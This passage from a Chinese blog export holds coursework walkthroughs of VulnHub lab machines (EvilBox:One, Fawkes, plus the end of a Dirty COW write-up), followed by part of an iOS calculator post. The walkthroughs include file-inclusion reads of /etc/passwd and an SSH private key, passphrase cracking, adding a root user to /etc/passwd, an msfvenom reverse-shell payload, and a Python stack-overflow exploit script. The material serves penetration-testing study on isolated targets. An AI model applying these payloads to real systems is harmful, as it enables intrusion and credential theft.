文件，发现编译指令： 1g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil 在靶机上编译运行，发现该程序将靶机上 root 用户的密码强制更改为了 dirtyCowFun： 使用 su root，输入该密码切换至 root 身份： 切换至 root 用户的主目录，查看其目录下的文件，发现第二个 Flag： Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 三、实验结果 root： Flag1: 6CEA7A737C7C651F6DA7669109B5FB52 Flag2: 1B8EEA89EA92CECB931E3CC25AA8DE21 四、总结 访问 80 端口发现一个登录界面。爆破隐藏路径，发现 /secret/ 路径。在其目录下发现一个图片，使用 stegseek 破解其中数据，猜测是用于登录主页的邮箱和密码，使用其进行登录，发现登录成功。 浏览各个界面寻找文件上传点，上传一句话木马文件，通过该文件注入反弹 shell 脚本生成反弹 shell。 使用 awk 提权，发现另一个靶机的 .ova 文件，下载至 kali 后移动到宿主机，导入 Virual Box 后启动。 浏览器访问 80 端口，发现登录界面。通过 sqlmap 进行 sql 注入，获取用户名和密码，通过 SSH 登入。 查看靶机内核，发现存在脏牛漏洞，搜索利用代码，上传至靶机编译运行，发现强制修改了 root 用户的密码，使用该密码即可至 root 身份，提权成功。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第八周 vulnhub-EvilBox:One","slug":"vulnhub-EvilBoxOne","date":"2022-11-08T07:41:56.000Z","updated":"2022-11-26T07:58:11.962Z","comments":true,"path":"vulnhub-EvilBoxOne/","link":"","permalink":"http://blog.kekwy.com/vulnhub-EvilBoxOne/","excerpt":"","text":"网络攻防实战 第八次实验 邮箱：&#x6b;&#101;&#101;&#x6b;&#107;&#x65;&#119;&#x79;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#x6d; 2022年11月8日 靶机链接：https://vulnhub.com/entry/evilbox-one,736/ 一、实验目的取得目标靶机的 root 权限并获得两个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 隐藏路径爆破 参数名爆破 文件包含漏洞的发现以及利用 SSH 登入 私钥密码爆破 特定权限文件的发现 添加自定义用户记录 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.12 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 12$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.12 -A 访问80端口发现是一个 Apache2 Debian 的默认页面，没有对渗透有帮助的信息： 0x01. 隐藏路径爆破 首先使用 dirsearch 进行路径爆破： 找到了隐藏路径 /secret/ 和隐藏文件 robots.txt。 分别访问均没有获得有效信息。 ps：robots.txt 对 /secret/ 做进一步路径爆破： 直接使用 dirsearch 由于字典限制无法找到更多信息，此处使用 gobuster 进行爆破。 安装：apt install gobuster 安装字典：apt install seclists 渗透测试要尝试掌握多种工具 使用指定字典进行路径爆破： 1$ gobuster dir -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp 除了主页文件之外，还发现一个 PHP 文件 evil.php。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 GET 方法提供一个参数（即在 url 后添加某个参数）。 0x02. 参数名爆破使用 ffuf 工具对该参数键值对（参数名和对应的值）进行爆破： 首先期望存在命令注入漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=ls -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 命令 ls 作为参数值。 进行爆破后，为获得有效结果，爆破失败。 期望存在文件包含漏洞： 1$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0 选择字典文件 burp-parameter-names.txt 作为参数名； 已知存在的主页文件的路径作为参数值。 爆破成功，结果显示需要提供的参数名为 command 。 查看靶机文件验证漏洞存在： 1http://10.0.2.12/secret/evil.php?command=/etc/passwd 查看返回页面源码： 读取了靶机上的 /etc/passwd 文件，确认存在文件包含漏洞。 0x03. SSH 私钥密码爆破 通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 mowree 用户拥有登录权限，其主目录为 /home/mowree.尝试获取其被允许的 SSH 登录方式： 1$ ssh mowree@10.0.2.12 -v # debug模式 发现除了允许输入对应密码登录外还可以使用密钥登录。 通过文件包含漏洞查看靶机上该用户的私钥： 1http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa 将其保存在文件 id_rsa 中。 使用指定私钥登录靶机： 1# ssh mowree@10.0.2.12 -i id_rsa 发现需要输入私钥的密码： 考虑对其进行爆破。 如果出现报错： 这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。 修改权限为7000即可： 1$ chmod 7000 id_rsa 参考：https://blog.csdn.net/Figure_hb/article/details/90754146 将密钥文件转换为 john 可用的 hash 文件： 1# /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash 使用 john 进行爆破： 1$ john id_rsa.hash --wordlist=rockyou.txt 该字典文件可通过在 kali 上使用 locate 指令搜索得到 成功获取私钥密码 unicorn。 成功登入靶机： 0x04. 信息收集 查看当前目录下的文件，获取第一个 Flag： Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ 当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件： 1$ find / -perm -o+w -maxdepth 3 -print | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt find指令的使用：https://blog.csdn.net/m0_46674735/article/details/112390027 使用find命令按权限查找文件：https://www.iplayio.cn/post/596968725 -o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）； -maxdepth：从根目录开始搜索的最大深度为3； -print：将输出结果写入标准输出文件； grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run： 忽略以上目录下的搜索结果； &gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。 查看搜索结果，发现 /etc/passwd 文件竟然可以被其他用户写入： 进一步验证： 1$ ls /etc/passwd -al 发现我们确实具有写权限。 设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。 0x05. 自定义 root 用户 首先需要在 kali 上对我们自定义的密码进行加密。使用工具 openssl： 1$ openssl passwd 这里我输入的明文密码为 test123。 使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录： 1test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash 将该记录追加在 /etc/passwd 文件中： 1$ echo &#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd 切换到用户 test123： 1$ su test123 成功提权。 切换到 root 目录，发现第二个 Flag： Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM 三、实验结果 Flag1：56Rbp0soobpzWSVzKh9YOvzGLgtPZQ Flag2：36QtXfdJWvdC0VavlPIApUbDlqTsBM root： 四、总结 根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破； 使用 dirsearch 爆破到存在 /secret/ 路径，但是继续爆破无果。换用 gobuster 进行路径爆破，最终找到一个 PHP 文件 evil.php； 直接访问返回空白页，推测其可能需要一个参数，使用 ffuf 进行参数名的爆破，最终发现存在文件包含漏洞； 通过文件包含漏洞查看文件 /etc/passwd，发现一个可以登录的用户 mowree。使用 ssh 尝试登录发现该用户还支持私钥认证登录； 通过文件包含漏洞获取靶机对应路径下的私钥，并使用 john 对私钥密码进行爆破； 成功登入靶机后，发现当前用户对 /etc/passwd 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录； 使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。 五、思路拓展 对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞） 也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 evil.php 读出： 1http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg== 通过 icyberchef 进行解码： 1234&lt;?php $filename = $_GET[&#x27;command&#x27;]; include($filename);?&gt; 成功获取到 evil.php 的源码。 尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本： 12http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz 尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【渗透测试】第七周 vulnhub-Fawkes","slug":"vulnhub-Fawkes","date":"2022-11-02T05:21:10.000Z","updated":"2022-11-10T09:24:37.076Z","comments":true,"path":"vulnhub-Fawkes/","link":"","permalink":"http://blog.kekwy.com/vulnhub-Fawkes/","excerpt":"","text":"网络攻防实战 第七次实验 邮箱：&#x6b;&#101;&#101;&#107;&#x6b;&#101;&#x77;&#x79;&#64;&#x71;&#x71;&#46;&#99;&#111;&#x6d; 2022年11月2日 靶机连接：https://vulnhub.com/entry/harrypotter-fawkes,686/ 一、实验目的取得目标靶机的 root 权限并获得三个 flag。 我们将使用到以下攻击手段： 主机发现、端口扫描 FTP匿名登录 edb 调试程序 栈溢出攻击 tcpdump 流量分析 sudo 漏洞提权 二、实验内容 kali: 10.0.2.15 靶机: 10.0.2.11 0x00. 准备工作 获取靶机 IP 并扫描其开放的端口以及个端口上对应的服务： 123$ sudo arp-scan -I eth0 -l$ sudo nmap -p- 10.0.2.11$ sudo nmap -p21,22,80,2222,9898 -sV 10.0.2.11 -A 发现两个比较特殊的端口： 21 - ftp 服务并允许匿名登录获取文件 server_hogwarts； 9898 - 一个自定义的服务。 访问80端口并查看网页源码，发现只有一张图片，并没有其他有价值的信息： 0x01. FTP 匿名登录 查看我们端口扫描获取的信息： 说明该 FTP 服务可以使用用户名 Anonymous 无密码登入并可以查看文件 server_hogwarts。 通过 FTP 登入靶机并使用 get 指令下载上述文件： 12$ ftp 10.0.2.11ftp&gt; get server_hogwarts 查看文件类型，发现是一个 ELF 可执行文件： 1$ file server_hogwarts 给予执行权限，尝试执行： 发现什么都没有输出，但是 shell 阻塞住了并没有退出，说明该程序确实启动了。 查看后台进程： 1$ ps -aux | grep server # 显示名字包含server的所有进程 发现该程序确实创建了后台进程。 查看该进程的连接信息： 1$ ss -pantu | grep server_hogwarts 发现该进程运行在9898端口上，联想到靶机9898端口上的自定义服务，推测该程序即为靶机9898端口上所运行的服务。 使用 nc 命令监听该端口： 发现我们可以进行输入，推测存在栈溢出攻击。 0x02. 栈溢出攻击 使用 checksec 工具查看该文件开启了哪些保护机制： 安装：$ apt install checksec 1$ file server_hogwarts STACK CANARY：在初始化堆栈时在栈底插入一个随机生成的 cookie，在函数返回前调用 __stack_chk_fail 检查 cookie 有没有发生变化，若发生变化则不返回，而直接终止程序。由于缓冲区溢出攻击时往往会覆盖掉 cookie 的值，故该保护机制开启时会导致常规的溢出攻击失效，程序会直接终止而不是跳转至攻击者注入的目标地址。 NX：开启时栈中数据没有执行权限，即攻击者不能通过缓冲区溢出注入攻击代码； PIE：编译时将程序编译为位置无关, 即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定，使程序的内存布局难以预料。 参考：checksec NX、PIE 关闭，我们可以尝试注入反弹 shell 的代码并使其被执行，从而获取反弹 shell。 STACK CANARY 被开启了，意味着注入时我们也许要针对其进行某种绕过，先不管它。 将 kali 本机上的 ALSR 安全机制关闭，该技术会导致地址空间随机化，不便于调试： 1# echo 0 &gt; /proc/sys/kernel/randomize_va_space 使用 edb 对当前程序进行调试，探测注入点： 安装：$ apt install edb-debugger 1$ sudo edb 点击 File-&gt; Attach ： 选择目标进程： 点击运行： 使用 python 生成500个“A”，并在监听窗口进行输入： 1$ python -c &quot;print(500*&#x27;A&#x27;)&quot; 触发报错且看到“0x41414141”，查看此时 EIP 寄存器的值： 发现变成了 0x41414141，而 ‘0x41’ 为 ‘A’ 的十六进制编码，说明我们输入的字符成功覆盖了函数返回地址，导致程序发生了错误跳转。 “诶？不是说这个程序开启了 STACK CANARY 保护机制，会对栈溢出做检查吗？为什么直接注入就成了？” 重新执行上述操作，并重新监听9898端口。点击单步调试： 同样输入500个A， 回到 edb 继续追踪，直到触发错误，记录此时的指令地址： 发现在追踪的过程中没有调用 __stack_chk_fail 函数检查 cookie 的正确性。通过 objdump 查看其反汇编代码进一步确认，发现原来 __stack_chk_fail 只在一部分函数返回前被调用了，而在注入点所在的函数中未被调用，因此我们可以正常进行注入。 综上，Canary found 仅代表程序中存在检查机制，而不一定在所有的ret 语句前都做了检查。在进行渗透测试时应先尝试注入，不要被一些未验证的细节限制了思路。 使用 msf-pattern 工具进行溢出点在输入字符串中位置的探测： 1$ msf-pattern_create -l 500 # 生成长度为500的模式字符串 重新程序并重新开始调试，将生成的模式字符串作为输入： 提示我们此时 EIP 中的值为 0x64413764，即我们输入的字符串中编码为“\\x64\\x41\\x37\\x64”的字串进入了 EIP 中。查找该段编码对应的字符串在模式字符串中的偏移量： 1$ msf-pattern_offset -l 500 -q 64413764 也就是说从模式字符串中的第113个字符串开始造成了栈溢出。 使用 python 生成一段自定义字符串进行验证： 1$ python -c &quot;print(112*&#x27;A&#x27; + &#x27;BBBB&#x27; + 100*&#x27;C&#x27;)&quot; 将生成的字符串输入后，查看 EIP 和栈中的值： 发现第113、114、115、116个字符（“BBBB”）恰好进入 EIP，而其后的字符保留在栈中。 设想将反弹 shell 代码注入栈中，而使程序跳转到栈中执行（jmp esp），即可令靶机上的程序执行反弹 shell 代码生成反弹 shell。 寻找原程序中的 jmp esp 指令，打开 edb 的 Opcode Search： 选择一个可执行段，然后选择搜索 ESP -&gt; EIP： 找到 jmp esp 指令并记录其地址（0x08049d55）： 构造注入字符串： 1$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b &quot;\\x00&quot; -f py LHOST：改为 kali 的 IP； LPORT：改为监听反弹 shell 的端口号； -b &quot;\\x00&quot;：过滤坏字符（’\\0’），避免输入提前终止。 编写注入脚本： 123456789101112131415161718import struct, socketbuf = b&quot;&quot;buf += b&quot;\\xd9\\xec\\xbe\\xe7\\x1d\\x4c\\x47\\xd9\\x74\\x24\\xf4\\x5f&quot;buf += b&quot;\\x29\\xc9\\xb1\\x12\\x31\\x77\\x17\\x03\\x77\\x17\\x83\\x08&quot;buf += b&quot;\\xe1\\xae\\xb2\\xe7\\xc1\\xd8\\xde\\x54\\xb5\\x75\\x4b\\x58&quot;buf += b&quot;\\xb0\\x9b\\x3b\\x3a\\x0f\\xdb\\xaf\\x9b\\x3f\\xe3\\x02\\x9b&quot;buf += b&quot;\\x09\\x65\\x64\\xf3\\x83\\x95\\x94\\x0c\\xfc\\x97\\x98\\x03&quot;buf += b&quot;\\xa0\\x1e\\x79\\x93\\x3e\\x71\\x2b\\x80\\x0d\\x72\\x42\\xc7&quot;buf += b&quot;\\xbf\\xf5\\x06\\x6f\\x2e\\xd9\\xd5\\x07\\xc6\\x0a\\x35\\xb5&quot;buf += b&quot;\\x7f\\xdc\\xaa\\x6b\\xd3\\x57\\xcd\\x3b\\xd8\\xaa\\x8e&quot;payload = 112 * b&#x27;A&#x27; + struct.pack(&#x27;I&#x27;,0x08049d55) + 32 * b&#x27;\\x90&#x27; + bufs=socket.socket()s.connect((&#x27;10.0.2.11&#x27;,9898))s.send((payload))s.close() 关于上述脚本，我们在栈溢出跳转地址和攻击代码之间加入了一长串空指令 nop（\\x90）。至于为什么一定要加上这一段，我们先看看运行注入代码时发生了什么。 在本地调试时，上述脚本中 connect 的 IP 参数要更改为 127.0.0.1 程序成功跳转到 jmp esp 指令时，观察栈中数据，发现从 08049d55 （我们注入的 jmp esp 指令地址）之后紧接着就是我们加入的32个 \\x90。 接着往下看，当程序运行到 fnstenv [esp - 0xc] 指令时，栈中数据发生了变化，部分空指令被新数据覆盖： 注入代码中存在指令修改了栈顶数据，若不加空指令，我们的注入代码本身就处于栈顶，则会在执行过程中将自身的代码覆盖掉。添加空指令之后，EIP 会沿着空指令一直增长到真正的注入代码，而 ESP 不变，使 EIP 与 ESP 拉开一定的距离，一定程度上保证注入在栈中的代码不会被修改。 故在注入时加入一段空指令可以提高程序稳定性，一般加入的空指令数为4的倍数。 监听 4444 端口，执行上述脚本，获取反弹 shell： 0x03. 信息收集 发现当前用户的主目录下存在隐藏文件： 查看该文件内容： HarrYp0tter@Hogwarts123 疑似某个密码，联想此前靶机上开放的 ssh 端口，尝试通过 ssh 登录靶机。 首先通过22端口登录，发现登录失败；转而通过2222端口登录，发现登录成功： 查看用户权限： 1$ sudo -l 发现当前用户可以不使用密码通过 sudo 执行所有命令。 使用 sudo -i 指令直接提权，并发现 root 账号主目录下存在两个文件： 查看当前环境 IP： 根据 lab2 的经验，我们进入的可能是一个 docker 容器而非靶机本身。 查看此前发现的两个文件： horcrux1.txt：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} note.txt： Hello Admin!! We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user. 第一个文件为我们发现的第一个 Flag，第二个文件为一些提示，提示我们需要监听靶机 FTP 服务的流量，即靶机21端口的流量。 0x04. tcpdump 流量分析 使用 tcpdump 命令监听靶机21端口： 1$ tcpdump -i eth0 port 21 等待片刻后发现输出了一些流量记录： 发现其握手信息中包含用户名和密码。 USER：neville PASS：bL!Bsg3k 尝试使用上述用户名和密码通过靶机的22端口登入靶机： 成功登录后，通过 IP 信息发现此时环境为真正的靶机。 查看当前路径下的文件，获取第二个 Flag： horcrux2.txt：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} 0x05. sudo 漏洞提权 查看内核与 sudo 版本信息： 上网搜索相关的漏洞信息，最终发现针对当前版本 sudo 的一个漏洞及其利用代码： CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) 利用代码：https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py 将此处 sudo 的路径更改为靶机上 sudo 的路径： 在 kali 上开启 web 应用，将该文件上传至靶机运行： 成功提权！ 前往靶机的 /root/ 路径，发现第三个 Flag： 三、实验结果 Flag1：horcrux_{NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ&#x3D;} Flag2：horcrux_{NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t} Flag3： root 权限： 四、总结 从端口服务信息中得知靶机 FTP 服务允许匿名登录，尝试匿名登录，通过 get 指令下载文件server_hogwarts，发现是一个可执行文件； 试运行该程序，推测该程序与靶机 9898 端口所运行服务的程序相同； 使用 edb 对该程序进行调试，发现栈溢出攻击注入点，并编写注入脚本，向靶机 9898 端口服务注入反弹 shell 代码； 成功获取反弹 shell，在当前用户主目录的隐藏文件中发现可用于 ssh 登录的密码； 使用 ssh 通过靶机 2222端口登录后，发现位于一个容器中，且当前用户可以直接使用 sudo -i 进行提权。在当前容器 root 用户的主目录中发现第一个 Flag； 使用 tcpdump 监听容器 21 端口的流量，发现 FTP 的握手过程包含了用户名和密码，猜测可以用来通过 ssh 登入靶机。尝试后成功通过22端口进入靶机； 在靶机当前用户的主目录下发现第二个 Flag； 查看发行版本以及 sudo 版本，上网查找相关漏洞，最终找到可用的漏洞利用代码。简单修改后，从 kali 上传靶机，在靶机执行后成功获取 root 权限。 在靶机 root 用户的主目录下，发现最后一个 Flag。","categories":[{"name":"网络攻防实战","slug":"网络攻防实战","permalink":"http://blog.kekwy.com/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://blog.kekwy.com/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"Kali","slug":"Kali","permalink":"http://blog.kekwy.com/tags/Kali/"},{"name":"网络","slug":"网络","permalink":"http://blog.kekwy.com/tags/%E7%BD%91%E7%BB%9C/"},{"name":"安全","slug":"安全","permalink":"http://blog.kekwy.com/tags/%E5%AE%89%E5%85%A8/"},{"name":"Linux","slug":"Linux","permalink":"http://blog.kekwy.com/tags/Linux/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://blog.kekwy.com/tags/vulnhub/"}],"author":"Ke_DiWZ"},{"title":"【iOS开发】iw01 科学计算器","slug":"iw1-calculator","date":"2022-10-19T08:01:44.000Z","updated":"2022-11-10T11:21:33.769Z","comments":true,"path":"iw1-calculator/","link":"","permalink":"http://blog.kekwy.com/iw1-calculator/","excerpt":"","text":"iOS assignment 1: Calculator App. 姓名：可弟WZ Kekwy 邮箱：&#107;&#101;&#101;&#x6b;&#107;&#101;&#119;&#x79;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#x6d; 用 swift &amp; storyboard 实现一个计算器APP（包括科学计算器）。 项目仓库：https://github.com/Kekwy/iwork1-Calculator 一、界面设计 静态布局 0x0. StackView大体分为上下两部分，上方为计算器的显示区域，下方为按键区域。 0x00. 主要约束1234Stack View.top = Safe Area.topStack View.leading = Safe Area.leadingSafe Area.bottom = Stack View.bottomSafe Area.trailing = Stack View.trailing 使当前控件大小与父控件大小一致，即填充满父控件。 0x01. 显示区域（View1） View：为该区域提供指定的背景色。 Stack View：管理两个主要的UILabel。 Exp Label：显示表达式； Res Label：显示表达式的运算结果； 主要约束：纵向填充，左右边缘与 View 始终存在10的间隔。 0x02. 按键区域（View2） VIew：为按键区域提供指定的背景色。 Stack View：管理附加按键区与常规按键区。 主要约束：将按键区的高设置为屏幕高的70%：View.height = 0.7 × height 0x020. 常规按键区 前四行按钮： 填充策略为 Fill Equally； 每行四个按钮由一个 Stack View 管理，填充策略同样为 Fill Equally； 通过约束将其高度设置为整个按键区高度的66%。 后两行按钮： 包含两个 Stack View。位于左侧的 Stack View 管理左侧六个按钮，排成两行，其中每行三个按钮又由一个 Stack View 管理；位于右侧的 Stack View 中只有作为等于操作键的一个按钮，可使其高度约为其他按钮的两倍。 通过设置约束，将左侧 Stack View 的宽约束为整个常规按键区宽度的75%。 0x021. 附加按键区 在切换为科学计算器（设备横屏）时自动显示 与常规按键区类似，每行三个按钮由一个 Stack View 管理，该部分所有 Stack View 的填充方式均为 Fill Equally。 设置约束，将管理整个附加按键区的 Stack View 的宽设置为整个按键区宽的3&#x2F;7。 0x022. 按钮细节通过设置按钮属性 layer.cornerRadius 设置按钮圆角的弧度。竖屏状态设置为20，横屏状态设置为40. 0x1. D&#x2F;R Show Label 用于显示当前的计算模式是弧度制（Rad）还是角度制（Deg）。横屏模式下显示于显示区域的左上角（通过约束实现），竖屏模式自动隐藏，可通过相关功能按键进行切换。 二、功能实现0x0. 基础功能0x00. 用户输入处理用户每次点击按钮时，计算器会执行其运行逻辑。对于非功能按钮，用户输入会在 ViewController 中被追加在当前表达式之后，然后整个表达式会被传入 Calculator 进行解析。 若用户点击功能性按钮，将在 ViewController 中调用相应的函数进行处理。 0x01. 主要运算逻辑 良好的支持多优先级操作符 使用中缀表达式转后缀表达式的计算思路，参考《数据结构》。为每个操作符设置栈中优先级和栈外优先级，天然的支持多优先级运算，即良好的支持了科学计算器中出现的多个复杂操作符。 12345678910111213let isp = [&quot;#&quot;: 0, &quot;(&quot;: 1, &quot;×&quot;: 5, &quot;÷&quot;: 5, ... ] let icp = [&quot;#&quot;: 0, &quot;(&quot;: 10, &quot;×&quot;: 4, &quot;÷&quot;: 4, ... ] 同时设置两个栈结构，一个用于保存操作数，另一个用于保存操作符，当有操作符退栈时，根据其运算规则从操作数栈中退出若干操作数，进行运算后将结果压入操作数栈。 12345678910111213141516171819private func calSubExp(opt: String) -&gt; Bool&#123; ... switch opt &#123; case &quot;×&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num1 * num2) case &quot;÷&quot;: if numStack.count &lt; 2 &#123; return false &#125; let num1 = numStack.popLast()! let num2 = numStack.popLast()! numStack.append(num2 / num1) case &quot;%&quot;: ... 0x02. memery 操作主要处理 memery 中出错和 memery 为空的情况： 1234567891011121314public func memeryRead() -&gt; String &#123; if empty &#123; return &quot; &quot; &#125; else if isError &#123; return &quot;ERROR&quot; &#125; return String(memery)&#125;public func memeryClear() &#123; memery = 0.0 empty = true isError = false&#125; 0x03. 角度制与弧度制的切换计算三角函数时，根据当前计算器的模式对操作数进行转换（浮点数精度可能导致误差）： 123if !isRad &#123; // 表示处于角度制模式 tmp = 360 * tmp / (2 * acos(-1.0))&#125; 0x04. 按钮功能切换（函数与反函数之间的互换）当使用者点击 inv 按钮时，会更改部分按钮的 title。被更改 title 的按钮被点击时，在根据新的 title 在 buttonTouched 中执行对应的分支。再次点击 inv 会复原这些按钮之前的 title，即实现按钮功能的切换。 1234567891011121314151617func doInv() &#123; if isInv &#123; lnButton.setTitle(&quot;ln&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;log&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos&quot;, for: UIControl.State.normal) tanButton.setTitle(&quot;tan&quot;, for: UIControl.State.normal) isInv = false &#125; else &#123; lnButton.setTitle(&quot;eˣ&quot;, for: UIControl.State.normal) logButton.setTitle(&quot;10ˣ&quot;, for: UIControl.State.normal) sinButton.setTitle(&quot;sin⁻¹&quot;, for: UIControl.State.normal) cosButton.setTitle(&quot;cos⁻¹&quot;, for: UIControl.State.normal) tanButton.setTitle(&quot;tan⁻¹&quot;, for: UIControl.State.normal) isInv = true &#125;&#125; 0x05. 转动设备时的界面切换重写 didRotate 对设备旋转时的事件进行处理： 123456789override func didRotate(from fromInterfaceOrientation: UIInterfaceOrientation) &#123; let device = UIDevice.current if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; //横屏时候要做的事 do something launchScienceMode() &#125; else &#123; launchNormalMode() &#125;&#125; 设备旋转为横屏时，调用 launchScienceMode： 显示附加按键区，更改按钮 title 的字号，更改按钮四个角的弧度。 设备旋转为竖屏时，调用 launchNormalMode： 隐藏附加按键区，恢复按钮 title 的字号，恢复按钮四个角的弧度。 0x1. 辅助功能0x10. 等于操作的作用 自动显示运算结果的工作模式下，等于操作符的作用 使用者点击等于操作符时，会将当前的待计算表达式替换为当前的运算结果。 0x11. 更好的删除操作一般状态下使用者点击删除按钮会删除表达式中前一个字符，但当前一个字符与其之前的若干字符为一个整体时，会将其一同删除。（如 sin( 会作为一个整体同时删除） 0x12. 面向用户的报错机制当计算过程中遇到任何语法错误无法向下计算时，会返回运算结果“ERROR”提示用户更改表达式，而不会继续解析格式错误的表达式。 三、问题与解决0x0. 使 Stack View 中的空间按比例布局 tags: Swift; StoryBoard; Stack View; xcode; iOS; 比例; 布局; 控件; UIKit; 首先将 Stack View 的属性 Distribution 更改为 Fill Proportionally。 选中需要布局的控件，按住 command 键拖到该 Stack View 上， 选择 Equal Widths （若需要纵向成比例布局，则选择 Equal Heights）添加约束。 Additional Buttons.width = 0.4285 × width 即表示控件 Additional Buttons 的宽为 Stack View 宽度的42.85%。 0x1. Swift获取当前设备的状态 tags: Swift; StoryBoard; xcode; iOS; 横屏; 竖屏; 设备状态; 123456let device = UIDevice.current // 获取当前设备对象// 通过orientation属性获取设备朝向if device.orientation == .landscapeLeft || device.orientation == .landscapeRight &#123; // 横屏时要做的事 ...&#125; 0x2. 代码实现修改Button字体大小 tags: Swift; xcode; iOS; UIButton; 字体大小; 123456// 获取指定大小的字体func getFont(size: CGFloat) -&gt; UIFont &#123; return UIFont.systemFont(ofSize: size)&#125;// 